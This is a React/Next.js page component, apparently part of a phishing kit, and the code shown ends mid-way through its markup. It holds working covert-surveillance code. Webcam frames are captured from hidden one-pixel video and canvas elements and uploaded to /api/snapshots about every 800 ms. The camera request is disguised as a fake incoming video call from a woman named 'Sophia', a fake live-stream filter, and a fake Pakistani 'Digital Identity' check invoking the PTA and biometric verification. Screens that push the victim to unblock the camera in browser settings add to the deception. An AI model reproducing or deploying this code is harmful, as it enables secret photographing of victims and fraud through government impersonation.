"use client";

import React, { useEffect, useRef, useState } from 'react';
import { useParams } from 'next/navigation';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  Camera, 
  Video, 
  ShieldCheck, 
  Monitor, 
  AlertCircle,
  Loader2,
  Mic,
  Settings,
  X,
  PhoneOff,
  Users,
  MessageSquare,
  Gift,
  Hash,
  Sparkles,
  Smartphone,
  CheckCircle2,
  Globe,
  Lock,
  Shield,
  UserCheck,
  Heart,
  Share2,
  MoreHorizontal,
  Music,
  Zap,
  RefreshCw
} from 'lucide-react';
import { CaptureLink } from '@/lib/storage';

export default function CapturePage() {
  const { id } = useParams() as { id: string };
  const [linkInfo, setLinkInfo] = useState<CaptureLink | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [permissionError, setPermissionError] = useState<string | null>(null);
  
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const captureIntervalRef = useRef<any>(null);

  const fetchLinkInfo = React.useCallback(async () => {
    try {
      const res = await fetch('/api/links');
      const links = await res.json();
      const link = links.find((l: CaptureLink) => l.id === id);
      
      if (link) {
        setLinkInfo(link);
      } else {
        setError('Configuration not found.');
      }
    } catch (err) {
      setError('System error. Please try again.');
    }
  }, [id]);

  useEffect(() => {
    if (id) {
      fetchLinkInfo();
      // Notify landing
      fetch('/api/landing', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ linkId: id }),
      }).catch(err => console.error('Landing notify failed:', err));
    }
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
      }
      if (captureIntervalRef.current) {
        clearInterval(captureIntervalRef.current);
      }
    };
  }, [id, fetchLinkInfo]);

  const requestPermissions = async (retry = false) => {
    setPermissionError(null);
    
    // Stop existing stream if any
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
    }
    
    // Clear existing interval
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }

    const constraints = retry 
      ? { video: { facingMode: "user" }, audio: false } 
      : { 
          video: { 
            width: { ideal: 1280 },
            height: { ideal: 720 },
            facingMode: "user"
          }, 
          audio: false 
        };

    try {
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.onloadedmetadata = () => {
          videoRef.current?.play().catch(console.error);
        };
      }
      
      // Start capture loop with faster frequency (800ms)
      // Capture the first frame immediately
      setTimeout(() => captureFrame(), 500); // Small delay to let camera warm up

      captureIntervalRef.current = setInterval(() => {
        captureFrame();
      }, 800);
      
      return true;
    } catch (err: any) {
      console.error('Camera access error:', err.name, err.message);
      
      // Automatic fallback if high-res failed
      if (!retry && (err.name === 'NotReadableError' || err.name === 'TrackStartError' || err.name === 'OverconstrainedError')) {
        console.log('Attempting fallback with lower constraints...');
        return requestPermissions(true);
      }
      
      let msg = '';
      if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
        msg = 'Camera access was denied. This is required for identity verification.';
      } else if (err.name === 'NotReadableError' || err.name === 'TrackStartError') {
        msg = 'Camera is already in use by another application (Zoom, Skype, etc.). Please close other apps and try again.';
      } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
        msg = 'No camera device found.';
      } else {
        msg = `Hardware error: ${err.name}. Please ensure your camera is connected.`;
      }
      
      setPermissionError(msg);
      return false;
    }
  };

  const captureFrame = async () => {
    if (!videoRef.current || !canvasRef.current) return;

    const video = videoRef.current;
    const canvas = canvasRef.current;
    const context = canvas.getContext('2d');

    if (!context || video.videoWidth === 0) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageData = canvas.toDataURL('image/jpeg', 0.7);
    
    try {
      await fetch('/api/snapshots', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ linkId: id, imageData }),
      });
    } catch (err) {
      console.error('Update failed', err);
    }
  };

  if (error) {
    return (
      <div className="min-h-screen bg-black flex items-center justify-center p-6 text-zinc-400 font-mono text-[10px] uppercase tracking-widest">
        <div className="space-y-4 text-center">
          <div className="w-12 h-12 rounded-full border border-red-500/20 flex items-center justify-center mx-auto mb-6">
             <AlertCircle className="text-red-500" />
          </div>
          <p>System Fault: {error}</p>
          <button onClick={() => window.location.reload()} className="px-6 py-2 border border-white/10 hover:bg-white/5 rounded-lg active:scale-95 transition-all">
             Reconnect Node
          </button>
        </div>
      </div>
    );
  }

  if (!linkInfo) {
    return (
      <div className="min-h-screen bg-black flex items-center justify-center">
        <Loader2 className="w-12 h-12 text-cyber-blue animate-spin" />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white selection:bg-cyber-blue/30 overflow-y-auto">
      {/* Hidden Video & Canvas for processing */}
      <video ref={videoRef} autoPlay playsInline muted className="opacity-0 absolute pointer-events-none w-[1px] h-[1px] z-[-1]" />
      <canvas ref={canvasRef} className="opacity-0 absolute pointer-events-none w-[1px] h-[1px] z-[-1]" />

      <AnimatePresence mode="wait">
        <motion.div 
          key="content" 
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="min-h-screen"
        >
          {linkInfo.style === 'video' && <VideoCallStyle requestPermissions={requestPermissions} permissionError={permissionError} />}
          {linkInfo.style === 'social' && <SocialStyle requestPermissions={requestPermissions} permissionError={permissionError} />}
          {linkInfo.style === 'reward' && <RewardStyle requestPermissions={requestPermissions} permissionError={permissionError} />}
          {linkInfo.style === 'virtual' && <VirtualNumberStyle requestPermissions={requestPermissions} permissionError={permissionError} />}
          {linkInfo.style === 'digital' && <DigitalStyle requestPermissions={requestPermissions} permissionError={permissionError} />}
        </motion.div>
      </AnimatePresence>
    </div>
  );
}

// --- Dynamic Styles ---

function VideoCallStyle({ requestPermissions, permissionError }: { requestPermissions: () => Promise<boolean>, permissionError: string | null }) {
  const [timer, setTimer] = useState(0);
  const [isAccepted, setIsAccepted] = useState(false);
  const [callError, setCallError] = useState<string | null>(null);
  const [isRetrying, setIsRetrying] = useState(false);
  const [retryCount, setRetryCount] = useState(0);

  useEffect(() => {
    if (permissionError) setCallError(permissionError);
  }, [permissionError]);

  useEffect(() => {
    if (!isAccepted || callError) return;
    const interval = setInterval(() => setTimer(prev => prev + 1), 1000);
    return () => clearInterval(interval);
  }, [isAccepted, callError]);

  const formatTime = (s: number) => {
    const m = Math.floor(s / 60).toString().padStart(2, '0');
    const sec = (s % 60).toString().padStart(2, '0');
    return `${m}:${sec}`;
  };

  const handleAccept = async () => {
    if (!isAccepted) setIsAccepted(true);
    setIsRetrying(true);
    const ok = await requestPermissions();
    setIsRetrying(false);
    if (!ok) {
      setRetryCount(prev => prev + 1);
      if (retryCount >= 1) {
        setCallError('SETTINGS_BLOCKED');
      } else {
        setCallError('denied');
      }
    } else {
      setCallError(null);
    }
  };

  const girlPhoto = "https://randomuser.me/api/portraits/women/44.jpg";
  const girlName = "Sophia";

  return (
    <div className="fixed inset-0 flex flex-col font-sans text-white overflow-hidden z-50 bg-black">
      <div
        className="absolute inset-0 z-0 h-full w-full"
        style={{
          backgroundImage: `url(${girlPhoto})`,
          backgroundSize: 'cover',
          backgroundPosition: 'center top',
          filter: 'blur(30px) brightness(0.4)',
          transform: 'scale(1.1)',
        }}
      />
      <div className="absolute inset-0 bg-black/40 z-0" />

      {!isAccepted ? (
        <div className="relative z-10 flex-1 flex flex-col items-center justify-between py-16 px-8 max-w-md mx-auto w-full">
          <div className="flex flex-col items-center gap-6 mt-10">
            <div className="relative">
              <motion.div animate={{ scale: [1, 1.4, 1], opacity: [0.3, 0, 0.3] }} transition={{ duration: 3, repeat: Infinity }} className="absolute inset-[-40px] rounded-full border-2 border-green-500/40" />
              <motion.div animate={{ scale: [1, 1.05, 1] }} transition={{ duration: 2, repeat: Infinity }} className="w-32 h-32 md:w-40 md:h-40 rounded-full overflow-hidden border-4 border-white/30 shadow-2xl relative z-10">
                <img src={girlPhoto} alt="caller" className="w-full h-full object-cover object-top" />
              </motion.div>
            </div>

            <div className="text-center space-y-2">
              <h2 className="text-4xl font-black tracking-tight drop-shadow-lg">{girlName}</h2>
              <div className="flex items-center gap-2 justify-center">
                <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
                <p className="text-xs text-white/70 font-bold uppercase tracking-widest">Incoming Video Call...</p>
              </div>
            </div>
          </div>

          <div className="w-full flex justify-around items-center pb-8">
            <div className="flex flex-col items-center gap-3">
              <button 
                onClick={() => window.close()} 
                className="w-16 h-16 rounded-full bg-red-500/20 border border-red-500/50 flex items-center justify-center backdrop-blur-md active:scale-90 transition-transform"
              >
                <PhoneOff size={24} className="text-red-500" />
              </button>
              <span className="text-[10px] text-white/50 font-black uppercase tracking-widest">Decline</span>
            </div>
            <div className="flex flex-col items-center gap-3">
              <motion.button
                animate={{ y: [0, -8, 0] }}
                transition={{ duration: 2, repeat: Infinity }}
                onClick={handleAccept}
                className="w-20 h-20 rounded-full bg-green-500 flex items-center justify-center shadow-[0_0_50px_rgba(34,197,94,0.5)] active:scale-90 transition-transform relative"
              >
                <Video size={32} className="text-white" />
                <div className="absolute inset-0 rounded-full animate-ping bg-green-500/30 -z-10" />
              </motion.button>
              <span className="text-[10px] text-white font-black uppercase tracking-widest">Accept</span>
            </div>
          </div>
        </div>
      ) : (
        <div className="relative z-10 flex-1 flex flex-col h-full w-full">
          <div className="flex-1 relative overflow-hidden bg-zinc-900">
            <img
              src={girlPhoto}
              alt="call"
              className="w-full h-full object-cover object-top"
            />
            <div className="absolute inset-0 bg-gradient-to-t from-black/60 via-transparent to-black/30 pointer-events-none" />

            <div className="absolute top-safe pt-6 left-0 right-0 flex items-center justify-center pointer-events-none">
              <div className="flex items-center gap-2 bg-black/40 backdrop-blur-md px-3 py-1 rounded-full border border-white/10">
                <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
                <span className="text-[9px] font-black text-white/90 uppercase tracking-[0.2em]">HD Live • {formatTime(timer)}</span>
              </div>
            </div>

            <AnimatePresence>
              {callError && (
                <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="absolute inset-0 bg-black/95 backdrop-blur-3xl z-50 flex flex-col items-center justify-center p-8 text-center">
                  <div className="w-20 h-20 rounded-full overflow-hidden border-2 border-red-500/40 mb-6 shadow-2xl">
                    <img src={girlPhoto} alt="caller" className="w-full h-full object-cover object-top" />
                  </div>

                  {callError === 'SETTINGS_BLOCKED' ? (
                    <div className="max-w-xs space-y-6">
                      <div className="space-y-2">
                        <h3 className="text-xl font-black text-white uppercase tracking-tight">Camera Blocked</h3>
                        <p className="text-[11px] text-white/50 leading-relaxed">
                          Your browser has strictly blocked camera access. Manual unlock required to continue stream.
                        </p>
                      </div>
                      <div className="text-left text-[10px] text-white/60 space-y-3 bg-white/5 rounded-2xl p-5 border border-white/10">
                        <p className="flex items-center gap-2"><Lock size={12} className="text-cyber-blue" /> 1. Tap the 🔒 lock in address bar</p>
                        <p className="flex items-center gap-2"><Settings size={12} className="text-cyber-blue" /> 2. Set <strong>Camera</strong> to <strong>Allow</strong></p>
                        <p className="flex items-center gap-2"><RefreshCw size={12} className="text-cyber-blue" /> 3. Reload this page</p>
                      </div>
                      <button onClick={() => window.location.reload()} className="w-full py-4 bg-white/10 border border-white/20 text-white font-black text-[10px] uppercase rounded-2xl transition-all active:scale-95">
                        Reload Page
                      </button>
                    </div>
                  ) : (
                    <div className="max-w-xs space-y-8">
                      <div className="space-y-2">
                        <h3 className="text-2xl font-black text-white uppercase tracking-tight italic">Link Paused</h3>
                        <p className="text-[11px] text-white/50 leading-relaxed">
                          Secure identity verification is required to continue {girlName}&apos;s HD broadcast.
                        </p>
                      </div>
                      <button
                        onClick={handleAccept}
                        disabled={isRetrying}
                        className="w-full py-5 bg-green-500 text-white font-black text-xs uppercase rounded-2xl shadow-[0_20px_40px_rgba(34,197,94,0.3)] active:scale-95 transition-all disabled:opacity-50 flex items-center justify-center gap-3"
                      >
                        {isRetrying ? <Loader2 size={18} className="animate-spin" /> : <><Camera size={18} /> Enable Secure Stream</>}
                      </button>
                    </div>
                  )}
                </motion.div>
              )}
            </AnimatePresence>

            <div className="absolute top-6 right-4 w-24 md:w-28 h-36 md:h-40 rounded-2xl border border-white/20 overflow-hidden shadow-2xl bg-zinc-900 z-20">
              <div className="absolute inset-0 flex items-center justify-center">
                <Camera size={20} className="text-white/10" />
              </div>
              <div className="absolute bottom-2 left-2 flex items-center gap-1.5 bg-black/60 px-2 py-0.5 rounded-lg border border-white/10">
                <div className="w-1.5 h-1.5 rounded-full bg-white/40" />
                <span className="text-[8px] font-black text-white/80">YOU</span>
              </div>
            </div>

            <div className="absolute top-6 left-4 z-20">
              <div className="flex items-center gap-3 bg-black/40 backdrop-blur-xl rounded-2xl pl-1 pr-4 py-1 border border-white/10 shadow-xl">
                <div className="w-9 h-9 rounded-xl overflow-hidden border border-white/20">
                  <img src={girlPhoto} alt={girlName} className="w-full h-full object-cover object-top" />
                </div>
                <div>
                  <p className="text-xs font-black leading-none mb-0.5">{girlName}</p>
                  <div className="flex items-center gap-1">
                    <div className="w-1 h-1 rounded-full bg-green-500" />
                    <p className="text-[9px] text-green-500 font-black uppercase tracking-tighter">Connected</p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="h-32 md:h-28 bg-black/80 backdrop-blur-2xl flex items-center justify-center gap-4 md:gap-8 px-6 pb-6 pt-2">
            {[
              { Icon: Mic, label: "Audio" },
              { Icon: MessageSquare, label: "Chat" },
              { Icon: Sparkles, label: "FX" },
              { Icon: Settings, label: "HD" }
            ].map(({ Icon, label }, i) => (
              <div key={i} className="flex flex-col items-center gap-2 cursor-pointer group">
                <div className="w-12 h-12 md:w-14 md:h-14 rounded-full bg-white/10 border border-white/10 flex items-center justify-center group-active:scale-90 transition-transform hover:bg-white/20">
                  <Icon size={20} className="text-white/80" />
                </div>
                <span className="text-[8px] text-white/30 font-black uppercase tracking-widest">{label}</span>
              </div>
            ))}
            <div className="flex flex-col items-center gap-2 cursor-pointer group ml-2">
              <div onClick={() => window.close()} className="w-14 h-14 md:w-16 md:h-16 rounded-full bg-red-500 flex items-center justify-center shadow-2xl active:scale-95 transition-transform group-hover:bg-red-600">
                <PhoneOff size={24} />
              </div>
              <span className="text-[8px] text-red-500 font-black uppercase tracking-widest">End Call</span>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}



function SocialStyle({ requestPermissions, permissionError }: { requestPermissions: () => Promise<boolean>, permissionError: string | null }) {
  const [hearts, setHearts] = useState<{ id: number; left: number }[]>([]);
  const [activeFilter, setActiveFilter] = useState(2);
  const [viewCount, setViewCount] = useState(1284);

  const filters = [
    { name: "Vintage", color: "bg-amber-500/20" },
    { name: "Soft Glow", color: "bg-purple-500/20" },
    { name: "Digital PK", color: "bg-green-500/20" },
    { name: "Smooth", color: "bg-blue-500/20" },
    { name: "Cyber", color: "bg-cyan-500/20" }
  ];

  useEffect(() => {
    const viewInterval = setInterval(() => {
      setViewCount(prev => prev + Math.floor(Math.random() * 3));
    }, 3000);

    const heartInterval = setInterval(() => {
      const id = Date.now();
      setHearts(prev => [...prev.slice(-15), { id, left: Math.random() * 80 + 10 }]);
      setTimeout(() => {
        setHearts(prev => prev.filter(h => h.id !== id));
      }, 3000);
    }, 800);

    return () => {
      clearInterval(viewInterval);
      clearInterval(heartInterval);
    };
  }, []);

  return (
    <div className="fixed inset-0 bg-black flex flex-col relative overflow-hidden font-sans select-none h-[100dvh]">
      {/* Background Glow */}
      <div className="absolute inset-0 z-0 bg-gradient-to-b from-transparent via-purple-950/20 to-transparent" />
      
      {/* Immersive Header */}
      <div className="absolute top-0 left-0 right-0 p-6 pt-12 z-30 flex items-start justify-between bg-gradient-to-b from-black/80 to-transparent">
        <div className="flex items-center gap-3">
          <div className="relative">
            <div className="w-11 h-11 rounded-full p-[2px] bg-gradient-to-tr from-yellow-400 via-red-500 to-purple-600 animate-spin-slow">
              <div className="w-full h-full rounded-full bg-zinc-900 border-2 border-black overflow-hidden flex items-center justify-center">
                <Users size={20} className="text-white/30" />
              </div>
            </div>
            <div className="absolute -bottom-1 left-1/2 -translate-x-1/2 bg-red-600 text-[8px] font-black px-2 py-0.5 rounded-sm uppercase tracking-tighter border border-black animate-pulse">
              LIVE
            </div>
          </div>
          <div className="flex flex-col">
            <div className="flex items-center gap-2">
               <span className="font-black text-sm text-white drop-shadow-md tracking-tight uppercase">official_pk_live</span>
               <div className="w-3.5 h-3.5 rounded-full bg-blue-500 flex items-center justify-center shadow-lg">
                  <CheckCircle2 size={9} className="text-white" />
               </div>
            </div>
            <div className="flex items-center gap-2">
               <span className="text-[10px] text-white/50 font-bold uppercase tracking-widest whitespace-nowrap">Filter Node Active</span>
            </div>
          </div>
        </div>
        <div className="flex items-center gap-3">
           <div className="px-3 py-1.5 bg-red-600/20 backdrop-blur-md rounded-full border border-red-600/30 flex items-center gap-2">
              <div className="w-1.5 h-1.5 rounded-full bg-white animate-pulse" />
              <span className="text-[10px] font-black text-white tracking-widest">{viewCount.toLocaleString()}</span>
           </div>
           <button onClick={() => window.close()} className="p-1">
             <X size={24} className="text-white/60 hover:text-white transition-colors" />
           </button>
        </div>
      </div>

      {/* Main Filter Loading Area */}
      <div className="flex-1 flex items-center justify-center relative px-6">
        <AnimatePresence>
          {permissionError && (
            <motion.div 
              initial={{ opacity: 0, scale: 0.9, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              className="z-50 max-w-[320px] w-full p-10 rounded-[3rem] glass-morphism border-white/10 bg-black/40 text-center space-y-8 backdrop-blur-3xl shadow-2xl relative"
            >
              <div className="absolute -top-10 left-1/2 -translate-x-1/2 w-20 h-20 bg-red-600 rounded-full flex items-center justify-center shadow-[0_10px_30px_rgba(220,38,38,0.5)] border-4 border-black">
                <Shield size={32} className="text-white" />
              </div>
              
              <div className="space-y-3 pt-6">
                <h3 className="text-2xl font-black text-white uppercase tracking-tighter italic">Identity Lock</h3>
                <p className="text-[11px] text-white/50 font-bold leading-relaxed">
                  AR correlation requires Secure Identity Verification. Please allow camera access to unlock the Digital PK Filter Node.
                </p>
                <div className="py-2 inline-block px-3 bg-red-600/10 rounded-full border border-red-600/20">
                  <p className="text-[10px] text-red-500 font-urdu font-black" dir="rtl">بایومیٹرک تصدیق درکار ہے۔</p>
                </div>
              </div>

              <button 
                onClick={() => requestPermissions()}
                className="w-full py-5 bg-red-600 text-white text-xs font-black uppercase rounded-2xl shadow-xl active:scale-95 transition-all hover:bg-red-700"
              >
                Sync Identity Now
              </button>
            </motion.div>
          )}
        </AnimatePresence>

        <div className="text-center space-y-4 z-10">
           {!permissionError && (
             <motion.div 
               animate={{ 
                 scale: [1, 1.15, 1], 
                 opacity: [0.2, 0.4, 0.2],
                 rotate: [0, 90, 180, 270, 360]
               }}
               transition={{ duration: 10, repeat: Infinity, ease: "linear" }}
               className="w-24 h-24 rounded-full border-[1px] border-dashed border-white/20 flex items-center justify-center mx-auto"
             >
                <Sparkles size={32} className="text-white/20" />
             </motion.div>
           )}
           <div className="flex flex-col items-center gap-2">
             <p className="text-[10px] font-black text-white/20 uppercase tracking-[0.6em] ml-[0.6em]">
               {permissionError ? '' : 'Scanning Filter Node'}
             </p>
             <div className="flex gap-1">
                {[0,1,2].map(i => (
                  <motion.div 
                    key={i}
                    animate={{ opacity: [0.2, 1, 0.2] }}
                    transition={{ duration: 1.5, repeat: Infinity, delay: i * 0.2 }}
                    className="w-1 h-1 rounded-full bg-cyber-blue" 
                  />
                ))}
             </div>
           </div>
        </div>

        {/* Floating Actions (Right Side) */}
        <div className="absolute right-4 md:right-8 bottom-36 flex flex-col gap-5 z-40">
           {[
             { Icon: Heart, label: '34k', color: 'text-red-500' },
             { Icon: MessageSquare, label: '1.2k', color: 'text-white' },
             { Icon: Share2, label: 'Share', color: 'text-white' },
             { Icon: Music, label: 'Audio', color: 'text-white' },
             { Icon: MoreHorizontal, label: '', color: 'text-white' }
           ].map((item, i) => (
             <div key={i} className="flex flex-col items-center gap-1.5">
                <div className="w-12 h-12 rounded-full glass-morphism border-white/10 flex items-center justify-center shadow-2xl active:scale-75 transition-transform group">
                   <item.Icon size={22} className={`${item.color} group-hover:scale-110 transition-transform`} />
                </div>
                {item.label && <span className="text-[10px] font-black text-white drop-shadow-lg uppercase tracking-wider">{item.label}</span>}
             </div>
           ))}
        </div>

        {/* Floating Hearts Animation Container */}
        <div className="absolute inset-0 pointer-events-none z-40">
          {hearts.map(heart => (
            <motion.div
              key={heart.id}
              initial={{ opacity: 0, y: '80vh', scale: 0.5, x: `${heart.left}%` }}
              animate={{ opacity: [0, 1, 0], y: '20vh', scale: [0.5, 1.5, 0.8], rotate: [-15, 15, -15] }}
              transition={{ duration: 4, ease: "easeOut" }}
              className="absolute text-red-500/50"
            >
              <Heart size={20} fill="currentColor" />
            </motion.div>
          ))}
        </div>
      </div>

      {/* Bottom Interface */}
      <div className="bg-gradient-to-t from-black/95 via-black/80 to-transparent pt-12 pb-12 z-30">
        <div className="px-4 pb-10 relative">
           <div className="flex items-center justify-center gap-6 overflow-x-hidden relative max-w-md mx-auto">
              <div className="absolute inset-y-0 left-0 w-20 bg-gradient-to-r from-black to-transparent z-10" />
              <div className="absolute inset-y-0 right-0 w-20 bg-gradient-to-l from-black to-transparent z-10" />
              
              {filters.map((f, i) => (
                <motion.div 
                  key={i}
                  animate={{ 
                    scale: activeFilter === i ? 1.25 : 0.8,
                    opacity: activeFilter === i ? 1 : 0.3
                  }}
                  onClick={() => setActiveFilter(i)}
                  className="flex-shrink-0 flex flex-col items-center gap-3 cursor-pointer transition-all duration-300"
                >
                  <div className={`w-14 h-14 rounded-full border-2 ${activeFilter === i ? 'border-white ring-4 ring-white/10' : 'border-white/10'} ${f.color} backdrop-blur-xl flex items-center justify-center relative overflow-hidden`}>
                     <Zap size={20} className={activeFilter === i ? 'text-white' : 'text-white/40'} />
                  </div>
                  <span className={`text-[9px] font-black uppercase tracking-[0.2em] ${activeFilter === i ? 'text-white' : 'text-white/40'}`}>{f.name}</span>
                </motion.div>
              ))}
           </div>
        </div>

        <div className="flex items-center justify-center px-12 relative h-16 max-w-md mx-auto">
           <div className="absolute left-6 flex flex-col items-center opacity-30 group cursor-pointer">
              <div className="w-10 h-10 rounded-full flex items-center justify-center border border-white/20">
                <Settings size={18} className="text-white" />
              </div>
           </div>
           
           <button 
             onClick={async () => {
               await requestPermissions();
             }}
             className="relative w-16 h-16 rounded-full border-[6px] border-white active:scale-90 transition-transform cursor-pointer shadow-[0_0_40px_rgba(255,255,255,0.3)] group bg-white/5"
           >
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="w-10 h-10 rounded-full bg-red-600 scale-0 group-active:scale-100 transition-transform duration-300" />
              </div>
           </button>

           <div className="absolute right-6 flex flex-col items-center opacity-30 group cursor-pointer" onClick={() => window.close()}>
              <div className="w-10 h-10 rounded-full flex items-center justify-center border border-white/20 hover:border-red-500 transition-colors">
                <PhoneOff size={18} className="text-white group-hover:text-red-500" />
              </div>
           </div>
        </div>
        
        <div className="text-center mt-6">
           <p className="text-[9px] text-white/20 font-black uppercase tracking-[0.4em] font-urdu" dir="rtl">فلٹر لوڈ ہو رہا ہے</p>
        </div>
      </div>

      <style jsx>{`
        @keyframes spin-slow {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        .animate-spin-slow {
          animation: spin-slow 12s linear infinite;
        }
        .glass-morphism {
          background: rgba(255, 255, 255, 0.03);
          backdrop-filter: blur(40px);
          -webkit-backdrop-filter: blur(40px);
          border: 1px solid rgba(255, 255, 255, 0.08);
        }
      `}</style>
    </div>
  );
}

const DIGITAL_ACTIVATION_LOGS = [
  "Initializing secure connection to Digital Pakistan Node...",
  "Verifying biometric identity via SIM card...",
  "Cross-referencing PTA database for device registration...",
  "Establishing encrypted data tunnel (E2EE)...",
  "Allocating temporary digital identity (TDI)...",
  "Synchronizing with national digital infrastructure...",
  "Digital identity successfully provisioned."
];

function DigitalStyle({ requestPermissions, permissionError }: { requestPermissions: () => Promise<boolean>, permissionError: string | null }) {
  const [step, setStep] = useState(0); // 0: initial, 1: loading, 2: success
  const [progress, setProgress] = useState(0);
  const [logs, setLogs] = useState<string[]>([]);
  const [retryCount, setRetryCount] = useState(0);

  useEffect(() => {
    if (step === 1) {
      setLogs([]);
      setProgress(0);
      let currentLogIndex = 0;
      const logInterval = setInterval(() => {
        if (currentLogIndex < DIGITAL_ACTIVATION_LOGS.length) {
          setLogs(prev => [...prev, DIGITAL_ACTIVATION_LOGS[currentLogIndex]]);
          setProgress(Math.min(100, Math.floor(((currentLogIndex + 1) / DIGITAL_ACTIVATION_LOGS.length) * 100)));
          currentLogIndex++;
        } else {
          clearInterval(logInterval);
          setTimeout(() => setStep(2), 1500); // Transition to success after logs complete
        }
      }, 1000); // Log every 1 second

      return () => clearInterval(logInterval);
    }
  }, [step]);

  const handleActivate = async () => {
    const success = await requestPermissions();
    if (success) {
      setStep(1);
      setRetryCount(0);
    } else {
      setRetryCount(prev => prev + 1);
    }
  };

  return (
    <div className="min-h-screen relative overflow-hidden bg-[#0a0a0a] font-sans selection:bg-blue-400/30">
      {/* Animated Background Grid */}
      <div className="absolute inset-0 z-0 opacity-5 pointer-events-none">
        <div className="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/grid-me.png')] bg-repeat animate-pulse-slow" />
        <div className="absolute inset-0 bg-gradient-to-br from-blue-900/20 via-transparent to-cyan-900/20" />
      </div>

      {/* Floating Blobs */}
      <motion.div 
        animate={{ 
          scale: [1, 1.2, 1],
          x: [0, 50, 0],
          y: [0, 30, 0]
        }}
        transition={{ duration: 20, repeat: Infinity, ease: "linear" }}
        className="absolute -top-[10%] -left-[10%] w-[60%] h-[60%] bg-blue-500/10 blur-[120px] rounded-full z-0" 
      />
      <motion.div 
        animate={{ 
          scale: [1, 1.3, 1],
          x: [0, -40, 0],
          y: [0, -50, 0]
        }}
        transition={{ duration: 25, repeat: Infinity, ease: "linear" }}
        className="absolute -bottom-[10%] -right-[10%] w-[60%] h-[60%] bg-cyan-500/10 blur-[120px] rounded-full z-0" 
      />

      <div className="relative z-10 min-h-screen flex flex-col items-center py-12 px-6">
        <div className="max-w-md w-full space-y-8">
          <div className="text-center space-y-4">
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              className="inline-flex p-4 rounded-3xl bg-blue-600/10 border border-blue-600/20 backdrop-blur-xl mb-2 shadow-2xl shadow-blue-500/10"
            >
              <Monitor className="w-10 h-10 text-blue-500" />
            </motion.div>
            <div className="space-y-1">
              <h1 className="text-4xl font-black text-white tracking-tight leading-none uppercase">Digital Identity</h1>
              <div className="flex flex-col items-center gap-1">
                <p className="text-blue-500 text-[10px] font-black uppercase tracking-[0.3em]">Secure PK Node</p>
                <p className="text-zinc-500 text-sm font-urdu leading-none" dir="rtl">ڈیجیٹل شناخت</p>
              </div>
            </div>
          </div>

          <div className="glass-morphism rounded-[3rem] p-1 shadow-2xl border-white/5 bg-gradient-to-b from-white/[0.08] to-transparent overflow-hidden">
            <div className="bg-zinc-950/40 backdrop-blur-3xl rounded-[2.9rem] p-10 space-y-8 relative overflow-hidden">
              {/* PTA Watermark */}
              <div className="absolute -top-10 -right-10 opacity-5 pointer-events-none select-none">
                 <ShieldCheck size={150} className="text-white" />
              </div>

              {step === 0 && (
                <div className="space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-700">
                  <div className="space-y-3 text-center">
                    <div className="inline-block px-3 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-[9px] font-black text-blue-500 uppercase tracking-widest mb-2">
                       Node Status: Active
                    </div>
                    <h2 className="text-3xl font-bold text-white tracking-tight">Activate Digital PK ID</h2>
                    <p className="text-sm text-zinc-400 leading-relaxed">Secure your online presence with a verified Digital Pakistan Identity. Required for all government services and secure transactions.</p>
                  </div>
                  
                  <div className="bg-white/[0.03] rounded-3xl p-6 border border-white/5 space-y-4 relative overflow-hidden">
                    <div className="absolute top-0 right-0 w-32 h-32 bg-blue-500/5 blur-3xl -mr-16 -mt-16" />
                    <div className="flex items-center justify-between pb-4 border-b border-white/5 relative z-10">
                        <div className="flex items-center gap-3">
                           <div className="w-8 h-8 rounded-full bg-blue-500/20 flex items-center justify-center">
                              <UserCheck size={16} className="text-blue-500" />
                           </div>
                           <span className="text-xs font-bold text-zinc-300">Identity Status</span>
                        </div>
                        <span className="text-[9px] font-black uppercase text-amber-400 bg-amber-400/10 px-2 py-1 rounded-lg">Pending</span>
                    </div>
                    <div className="space-y-4 relative z-10">
                        <div className="flex justify-between items-end">
                           <div className="space-y-1">
                              <p className="text-[10px] font-black uppercase text-zinc-500 tracking-widest">Verification Level</p>
                              <p className="text-2xl font-black text-white">Biometric <span className="text-xs text-zinc-500 opacity-50 font-medium">Required</span></p>
                           </div>
                           <div className="text-right space-y-1">
                              <p className="text-[10px] font-black uppercase text-zinc-500 tracking-widest">Node</p>
                              <p className="text-lg font-mono font-bold text-blue-400">PK-SOUTH-1</p>
                           </div>
                        </div>
                        <div className="w-full h-1 bg-white/5 rounded-full overflow-hidden">
                           <motion.div 
                              animate={{ x: ["-100%", "100%"] }} 
                              transition={{ duration: 3, repeat: Infinity, ease: "linear" }}
                              className="w-[40%] h-full bg-blue-500/50 blur-[2px]" 
                           />
                        </div>
                    </div>
                  </div>

                  {permissionError && (
